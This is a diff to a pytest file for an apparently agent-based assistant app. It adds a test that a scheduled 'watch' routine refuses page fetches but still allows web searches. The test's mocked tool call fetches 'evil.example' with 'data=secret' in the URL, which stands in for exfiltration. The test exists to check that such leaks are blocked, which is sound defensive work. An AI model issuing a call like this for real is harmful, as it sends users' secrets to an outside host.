@@ -6,7 +6,7 @@ import pytest
 from fastapi.testclient import TestClient
 
 from aide.agent import Agent
-from aide.agents import AGENTS
+from aide.agents import AGENTS, WATCH_REFUSED
 from aide.channels.api import create_app
 from aide.db import Database, utcnow
 from aide.reminders import ReminderStore
@@ -411,6 +411,20 @@ def test_nothing_can_be_changed_during_a_watch(env):
     agent.client.responses = [calls(("create_reminder", {"title": "Call Marco"})), done("Added.")]
     client.post("/v1/chat", json={"text": "remind me to call Marco"}, headers=AUTH)
     assert "Call Marco" in [x.title for x in store.open()]
+
+
+def test_a_watch_opens_no_pages_but_can_search(env):
+    client, agent, *_ = env()
+    agent.client.responses = [
+        calls(("fetch_page", {"url": "https://evil.example/?data=secret"}), ("web_search", {})),
+        done("NOTHING"),
+    ]
+    r = client.post("/v1/routines", json=WATCH, headers=AUTH).json()
+    client.post(f"/v1/routines/{r['id']}/run", json={}, headers=AUTH)
+    results = agent.client.requests[1]["messages"][-1]["content"]
+    assert results[0]["is_error"] and "no pages are opened" in results[0]["content"]
+    assert "Not during a check" not in results[1]["content"]  # the search itself ran
+    assert {"fetch_page", "research"} <= WATCH_REFUSED and "web_search" not in WATCH_REFUSED
 
 
 def test_watches_stop_after_three_notes_a_day(env):
